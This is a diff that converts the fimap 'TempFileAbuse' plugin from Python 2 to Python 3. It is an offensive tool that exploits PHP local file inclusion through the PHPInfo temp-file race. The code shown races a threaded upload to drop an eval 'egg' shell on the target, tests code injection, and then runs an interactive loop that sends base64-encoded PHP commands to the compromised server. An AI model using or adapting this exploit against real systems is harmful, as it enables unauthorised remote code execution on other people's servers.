@@ -6,7 +6,7 @@ from plugininterface import basePlugin
 # Plugin by Iman Karim <fimap.dev@gmail.com>
 # License: GPLv2
 
-import urlparse, re, socket, threading, base64, urllib, string, random
+import urllib.parse, re, socket, threading, base64, urllib.request, urllib.parse, urllib.error, string, random
 
 
 
@@ -66,14 +66,14 @@ class TempFileAbuse(basePlugin):
     def plugin_callback_handler(self, callbackstring, haxhelper):
         if (callbackstring == "TempFileAbuse.hax"):
             
-            print "-----------------------------------------------------------------------------"
-            print "This plugin wouldn't be possible without the hard research of"
-            print "     Gynvael Coldwind (http://gynvael.coldwind.pl)"
-            print "      and"
-            print "     Insomnia Security (http://insomniasec.com)"
-            print "since it's based on this paper:"
-            print "http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf"
-            print "-----------------------------------------------------------------------------"
+            print("-----------------------------------------------------------------------------")
+            print("This plugin wouldn't be possible without the hard research of")
+            print("     Gynvael Coldwind (http://gynvael.coldwind.pl)")
+            print("      and")
+            print("     Insomnia Security (http://insomniasec.com)")
+            print("since it's based on this paper:")
+            print("http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf")
+            print("-----------------------------------------------------------------------------")
             
             inp = -1
             
@@ -96,66 +96,66 @@ class TempFileAbuse(basePlugin):
                 options.append("q. Back to fimap")
                 
                 haxhelper.drawBox("PHPInfo Coldwind/Insomnia Glitch", options)
-                inp = raw_input("Choose action: ")
+                inp = input("Choose action: ")
                 
                 try:
                     idx = int(inp)
                     
                     if (idx == 1):
-                        self.phpinfourl = raw_input("Please type in the complete URL of the PHPInfo() file: ")
-                        print "PHPInfo() URL changed to: %s" %(self.phpinfourl)
+                        self.phpinfourl = input("Please type in the complete URL of the PHPInfo() file: ")
+                        print("PHPInfo() URL changed to: %s" %(self.phpinfourl))
                     
                     elif (idx == 2):
-                        print "AutoProbe not implemented right now :("
+                        print("AutoProbe not implemented right now :(")
                         
                     elif (idx == 3):
-                        tmp = raw_input("Please type in the number of attempts you wish: ")
+                        tmp = input("Please type in the number of attempts you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
-                                print "WTH. Zero or less attempts are not smart bro."
+                                print("WTH. Zero or less attempts are not smart bro.")
                             else:
                                 self.maxAttempts = n
-                                print "MaxAttempts changed to: %s" %(self.maxAttemps)
+                                print("MaxAttempts changed to: %s" %(self.maxAttemps))
                         except:
-                            print "Invalid number."
+                            print("Invalid number.")
                         
                     elif (idx == 4):
-                        tmp = raw_input("Please type in the number of threads you wish: ")
+                        tmp = input("Please type in the number of threads you wish: ")
                         try:
                             n = int(tmp)
                             if (n <= 0):
-                                print "WTH. Zero or less threads are not smart bro."
+                                print("WTH. Zero or less threads are not smart bro.")
                             else:
                                 self.maxThreads = n
-                                print "MaxThreads changed to: %s" %(self.maxThreads)
+                                print("MaxThreads changed to: %s" %(self.maxThreads))
                         except:
-                            print "Invalid number."
+                            print("Invalid number.")
                         
                     if (idx == 5):
-                        self.egg = raw_input("Please type location where to try to drop the egg: ")
-                        print "EggDrop location changed to: %s" %(self.egg)
+                        self.egg = input("Please type location where to try to drop the egg: ")
+                        print("EggDrop location changed to: %s" %(self.egg))
                     
                     elif (idx == 6):
-                        tmp = raw_input("Please type in the number of trash to append: ")
+                        tmp = input("Please type in the number of trash to append: ")
                         try:
                             n = int(tmp)
                             if (n < 0):
-                                print "WTH. Less than zero trash is not possible. Trust me I tried it hard."
+                                print("WTH. Less than zero trash is not possible. Trust me I tried it hard.")
                             else:
                                 self.trashFactor = n
-                                print "TrashFactor changed to: %s" %(self.trashFactor)
+                                print("TrashFactor changed to: %s" %(self.trashFactor))
                         except:
-                            print "Invalid number."
+                            print("Invalid number.")
                     
                     if (idx == 7):
                         if (self.phpinfourl != None and self.phpinfourl != ""):
-                            print "Checking if the URL you provided is really a PHPInfo file..."
+                            print("Checking if the URL you provided is really a PHPInfo file...")
                             code = self.doGetRequest(self.phpinfourl)
                             if (code.find("alt=\"PHP Logo\"") == -1):
-                                print "The URL '%s' is not a PHP info file! :(" %(self.phpinfourl)
+                                print("The URL '%s' is not a PHP info file! :(" %(self.phpinfourl))
                                 return
-                            print "Launching attack..."
+                            print("Launching attack...")
                             if (self.createEgg(haxhelper)):
                                 # SUCCESSFULLY CREATED EVAL SHELL AT self.egg
                             
@@ -170,19 +170,19 @@ class TempFileAbuse(basePlugin):
                             
                                 path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.egg)
                                 
-                                domain = urlparse.urlsplit(self.phpinfourl)[1]
-                                url = urlparse.urljoin("http://" + domain, path)
+                                domain = urllib.parse.urlsplit(self.phpinfourl)[1]
+                                url = urllib.parse.urljoin("http://" + domain, path)
                                 
                                 post = ""
                                 
                                 if (postdata != ""):
                                     post = postdata + "&"
                                 
-                                post += urllib.urlencode({"data": base64.b64encode(quiz)})
+                                post += urllib.parse.urlencode({"data": base64.b64encode(quiz)})
                                 res = haxhelper.doRequest(url, post, header)
                                 
                                 if (res == answer):
-                                    print "PHP Code Injection thru EggDrop works!"
+                                    print("PHP Code Injection thru EggDrop works!")
                                     xmlconfig = haxhelper.parent_codeinjector.config["XML2CONFIG"]
                                     shellquiz, shellanswer = xmlconfig.generateShellQuiz(haxhelper.isUnix)
                                     shell_test_code = shellquiz
@@ -195,7 +195,7 @@ class TempFileAbuse(basePlugin):
                                             code = item.generatePayload(shell_test_code)
                                             code = code.replace("<?php", "")
                                             code = code.replace("?>", "")
-                                            testload = urllib.urlencode({"data": base64.b64encode(code)})
+                                            testload = urllib.parse.urlencode({"data": base64.b64encode(code)})
                                             
                                             if (postdata != ""):
                                                 testload = "%s&%s" %(postdata, testload)
@@ -205,42 +205,42 @@ class TempFileAbuse(basePlugin):
                                                 working_shell = item
                                                 self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
                                                 
-                                                print "--------------------------------------------------------------------"
-                                                print "Welcome to the fimap_eggshell!"
-                                                print "This is a lite version of the fimap shell."
-                                                print "Consider this shell as a temporary shell you should get rid of asap."
-                                                print "Upload your own shell to be on the safe side."
-                                                print "--------------------------------------------------------------------"  
+                                                print("--------------------------------------------------------------------")
+                                                print("Welcome to the fimap_eggshell!")
+                                                print("This is a lite version of the fimap shell.")
+                                                print("Consider this shell as a temporary shell you should get rid of asap.")
+                                                print("Upload your own shell to be on the safe side.")
+                                                print("--------------------------------------------------------------------")  
                                                 
-                                                payload = raw_input(shell_banner)
+                                                payload = input(shell_banner)
                                                 
                                                 while (payload != "q" and payload != "Q"):
                                                     payload = item.generatePayload(payload)
                                                     payload = payload.replace("<?php", "")
                                                     payload = payload.replace("?>", "")
-                                                    payload = urllib.urlencode({"data": base64.b64encode(payload)})
+                                                    payload = urllib.parse.urlencode({"data": base64.b64encode(payload)})
                                                     if (postdata != ""):
                                                         payload = "%s&%s" %(postdata, payload)
                                                     code = self.doPostRequest(url, payload, header)
-                                                    print code
-                                                    payload = raw_input(shell_banner)
+                                                    print(code)
+                                                    payload = input(shell_banner)
                                                 
                                                 return
                                         else:
                                             self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
                                 else:
-                                    print "PHP Code Injection thru EggDrop failed :("
+                                    print("PHP Code Injection thru EggDrop failed :(")
                                     return
                             
                         else:
-                            print "No PHPInfo() URL defined."
+                            print("No PHPInfo() URL defined.")
                             
                 except (ValueError):
                     pass
             
     def createEgg(self, haxhelper):
-        host = urlparse.urlsplit(self.phpinfourl)[1]
-        path = urlparse.urlsplit(self.phpinfourl)[2]
+        host = urllib.parse.urlsplit(self.phpinfourl)[1]
+        path = urllib.parse.urlsplit(self.phpinfourl)[2]
         
         runningThreads = []
         
@@ -274,15 +274,15 @@ class TempFileAbuse(basePlugin):
                             break;
             
         if (success):
-            print "Egg dropped successfully!"
+            print("Egg dropped successfully!")
         
-        print "Waiting for remaining threads to finish..."
+        print("Waiting for remaining threads to finish...")
         while(len(runningThreads) > 0):
                 for t in runningThreads:
                     if t.finished:
                         runningThreads.remove(t)
         
-        print "Finished."
+        print("Finished.")
         
         return(success)
                     
@@ -323,7 +323,7 @@ class ProbeThread(threading.Thread):
             
                             
         if (receivedData.find("[tmp_name] =&gt") == -1):
-            print "File apperently not send?!?!"
+            print("File apperently not send?!?!")
         else:
             m = self.RE_SUCCESS_MSG.search(receivedData)
             if (m != None):
